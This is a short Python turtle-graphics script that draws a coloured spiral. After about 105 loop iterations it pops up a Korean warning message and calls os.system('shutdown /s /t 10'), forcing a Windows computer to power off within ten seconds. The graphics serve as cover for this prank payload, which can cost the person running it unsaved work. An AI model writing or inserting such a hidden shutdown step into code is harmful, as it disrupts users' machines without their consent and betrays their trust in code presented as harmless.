import turtle as t
import tkinter
import os

t.bgcolor("black")
a = 0; b = 0; a_ =0; b_ = 0
colours = ["red","magenta","blue","cyan","yellow","white"]
t.speed(0)
t.right(90)
t.forward(100)
t.right(90)
while True:
    t.forward(a)
    t.color(colours[b_])
    t.right(b)
    a += 6
    b+=2+ a_
    b_ += 1
    if b_ == 5:
        b_ = 0
    if b == 210:
        tkinter.messagebox.showwarning(title="종료", message="차단기 좀 내리세요")
        os.system("shutdown /s /t 10")
    t.hideturtle()
